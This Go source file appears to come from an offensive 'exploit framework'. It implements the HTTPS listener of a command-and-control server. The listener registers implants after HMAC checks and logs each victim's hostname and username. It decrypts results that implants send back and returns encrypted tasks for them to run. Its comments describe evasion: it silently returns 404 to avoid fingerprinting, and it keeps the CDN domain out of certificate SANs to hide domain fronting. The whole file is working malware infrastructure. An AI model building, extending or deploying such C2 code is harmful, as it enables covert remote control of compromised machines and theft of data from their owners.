package listeners

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"github.com/KKingZero/erebus-exploit-framwork/server/tasks"
	"google.golang.org/protobuf/proto"
)

// BeaconHandler processes Register and Beacon messages from implants.
type BeaconHandler struct {
	Sessions   *sessions.Manager
	Dispatcher *tasks.Dispatcher
	Secret     []byte // Pre-shared secret for HMAC validation
	OnEvent    tasks.EventCallback
}

// HTTPSListener is an HTTPS listener for implant callbacks.
type HTTPSListener struct {
	id             string
	name           string
	host           string
	port           uint32
	server         *http.Server
	handler        *BeaconHandler
	tlsCert        tls.Certificate
	startedAt      time.Time
	active         bool
	reverseProxy   bool
	trustedProxies map[string]bool
	mu             sync.Mutex
}

func NewHTTPSListener(config *pb.ListenerConfig, handler *BeaconHandler, ca *zcrypto.CertificateAuthority) (*HTTPSListener, error) {
	hosts := []string{config.Host}
	if config.Host == "" || config.Host == "0.0.0.0" {
		hosts = []string{"localhost", "127.0.0.1"}
	}

	// M14: Do NOT include CDN domain in certificate SANs — it leaks domain
	// fronting intent. The CDN domain is only used for Host header / TLS SNI
	// on the implant side, not in the server certificate.

	tlsCert, _, err := ca.GenerateServerCert(hosts)
	if err != nil {
		return nil, fmt.Errorf("generate server cert: %w", err)
	}

	id := config.Id
	if id == "" {
		var err2 error
		id, err2 = zcrypto.RandomID(8)
		if err2 != nil {
			return nil, fmt.Errorf("generate listener ID: %w", err2)
		}
	}

	// Build trusted proxy set
	trustedProxies := make(map[string]bool)
	for _, p := range config.TrustedProxies {
		trustedProxies[p] = true
	}

	return &HTTPSListener{
		id:             id,
		name:           config.Name,
		host:           config.Host,
		port:           config.Port,
		handler:        handler,
		tlsCert:        tlsCert,
		reverseProxy:   config.ReverseProxy,
		trustedProxies: trustedProxies,
	}, nil
}

func (l *HTTPSListener) ID() string                    { return l.id }
func (l *HTTPSListener) Name() string                  { return l.name }
func (l *HTTPSListener) Protocol() pb.ListenerProtocol { return pb.ListenerProtocol_LISTENER_HTTPS }
func (l *HTTPSListener) Address() string               { return fmt.Sprintf("%s:%d", l.host, l.port) }

func (l *HTTPSListener) Status() *pb.ListenerStatus {
	l.mu.Lock()
	defer l.mu.Unlock()
	return &pb.ListenerStatus{
		Id:        l.id,
		Name:      l.name,
		Protocol:  pb.ListenerProtocol_LISTENER_HTTPS,
		Address:   l.Address(),
		Active:    l.active,
		StartedAt: l.startedAt.Unix(),
	}
}

func (l *HTTPSListener) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/register", l.handleRegister)
	mux.HandleFunc("/beacon", l.handleBeacon)
	// Catch-all returns 404 for anything else (no fingerprinting)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})

	l.server = &http.Server{
		Addr:    l.Address(),
		Handler: mux,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{l.tlsCert},
			MinVersion:   tls.VersionTLS12,
		},
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	ln, err := net.Listen("tcp", l.Address())
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}

	tlsLn := tls.NewListener(ln, l.server.TLSConfig)

	l.mu.Lock()
	l.active = true
	l.startedAt = time.Now()
	l.mu.Unlock()

	go func() {
		log.Printf("[https] listener started on %s", l.Address())
		if err := l.server.Serve(tlsLn); err != nil && err != http.ErrServerClosed {
			log.Printf("[https] serve error: %v", err)
		}
		l.mu.Lock()
		l.active = false
		l.mu.Unlock()
	}()

	return nil
}

func (l *HTTPSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.server == nil || !l.active {
		return nil
	}
	l.active = false
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return l.server.Shutdown(ctx)
}

// resolveRemoteAddr extracts the real client IP when behind a reverse proxy.
// Only trusts X-Forwarded-For if reverse proxy mode is enabled and the direct
// connection comes from a trusted proxy address.
func (l *HTTPSListener) resolveRemoteAddr(r *http.Request) string {
	if !l.reverseProxy {
		return r.RemoteAddr
	}

	// C3: If reverseProxy is enabled but no trusted proxies configured,
	// ignore X-Forwarded-For entirely to prevent IP spoofing.
	if len(l.trustedProxies) == 0 {
		return r.RemoteAddr
	}

	// Validate the direct connection is from a trusted proxy
	directIP, _, _ := net.SplitHostPort(r.RemoteAddr)
	if !l.trustedProxies[directIP] {
		return r.RemoteAddr
	}

	// Use the rightmost untrusted IP from X-Forwarded-For
	xff := r.Header.Get("X-Forwarded-For")
	if xff == "" {
		return r.RemoteAddr
	}

	parts := strings.Split(xff, ",")
	for i := len(parts) - 1; i >= 0; i-- {
		ip := strings.TrimSpace(parts[i])
		if ip == "" {
			continue
		}
		if len(l.trustedProxies) > 0 && l.trustedProxies[ip] {
			continue
		}
		return ip
	}
	return r.RemoteAddr
}

func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.NotFound(w, r)
		return
	}

	reg := &pb.Register{}
	if err := proto.Unmarshal(body, reg); err != nil {
		// Silent drop — no fingerprinting
		http.NotFound(w, r)
		return
	}

	// Verify HMAC
	if err := zcrypto.VerifyHMAC(l.handler.Secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 30); err != nil {
		// Silent drop
		http.NotFound(w, r)
		return
	}

	sess := sessions.NewSession(reg, "https", l.resolveRemoteAddr(r))

	// Generate AES session key
	sessionKey, err := zcrypto.GenerateAESKey()
	if err != nil {
		log.Printf("[https] generate session key error: %v", err)
		http.NotFound(w, r)
		return
	}
	sess.SessionKey = sessionKey

	sessionID, err := l.handler.Sessions.Register(sess)
	if err != nil {
		log.Printf("[https] register error: %v", err)
		http.NotFound(w, r)
		return
	}

	log.Printf("[https] new session: %s (implant=%s, host=%s, user=%s)",
		sessionID, reg.ImplantId, reg.Hostname, reg.Username)

	if l.handler.OnEvent != nil {
		l.handler.OnEvent(&pb.Event{
			Type:      pb.EventType_EVENT_SESSION_NEW,
			Timestamp: time.Now().Unix(),
			SessionId: sessionID,
			Message:   fmt.Sprintf("New session from %s@%s", reg.Username, reg.Hostname),
		})
	}

	// Encrypt session key with pre-shared secret
	encryptedKey, err := zcrypto.AESEncrypt(l.handler.Secret, sessionKey)
	if err != nil {
		log.Printf("[https] encrypt session key error: %v", err)
		encryptedKey = nil
	}

	resp := &pb.RegisterResponse{
		Success:             true,
		SessionId:           sessionID,
		NextCheckinMs:       5000,
		EncryptedSessionKey: encryptedKey,
	}

	data, _ := proto.Marshal(resp)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}

func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.NotFound(w, r)
		return
	}

	beacon := &pb.Beacon{}
	if err := proto.Unmarshal(body, beacon); err != nil {
		http.NotFound(w, r)
		return
	}

	// Verify HMAC
	if err := zcrypto.VerifyHMAC(l.handler.Secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 30); err != nil {
		http.NotFound(w, r)
		return
	}

	sess, ok := l.handler.Sessions.GetByImplant(beacon.ImplantId)
	if !ok {
		http.NotFound(w, r)
		return
	}

	// Update checkin
	l.handler.Sessions.UpdateCheckin(sess.SessionID)

	// Process results — decrypt if encrypted
	var results []*pb.TaskResult
	if sess.SessionKey != nil && len(beacon.EncryptedResults) > 0 {
		plaintext, err := zcrypto.AESDecrypt(sess.SessionKey, beacon.EncryptedResults)
		if err != nil {
			log.Printf("[https] decrypt results error: %v", err)
		} else {
			payload := &pb.BeaconResultsPayload{}
			if err := proto.Unmarshal(plaintext, payload); err != nil {
				log.Printf("[https] unmarshal decrypted results error: %v", err)
			} else {
				results = payload.Results
			}
		}
	} else {
		results = beacon.Results
	}

	for _, result := range results {
		l.handler.Dispatcher.HandleResult(result)
	}

	// Drain pending tasks
	pendingTasks := sess.DrainTasks()

	resp := &pb.BeaconResponse{
		NextCheckinMs: 5000,
		Terminate:     !sess.IsAlive(),
	}

	// Encrypt tasks if session key is available
	if sess.SessionKey != nil && len(pendingTasks) > 0 {
		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks}
		plaintext, err := proto.Marshal(payload)
		if err != nil {
			log.Printf("[https] marshal tasks payload error: %v", err)
			resp.Tasks = pendingTasks // fallback
		} else {
			encrypted, err := zcrypto.AESEncrypt(sess.SessionKey, plaintext)
			if err != nil {
				log.Printf("[https] encrypt tasks error: %v", err)
				resp.Tasks = pendingTasks // fallback
			} else {
				resp.EncryptedTasks = encrypted
			}
		}
	} else {
		resp.Tasks = pendingTasks
	}

	data, _ := proto.Marshal(resp)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(data)
}
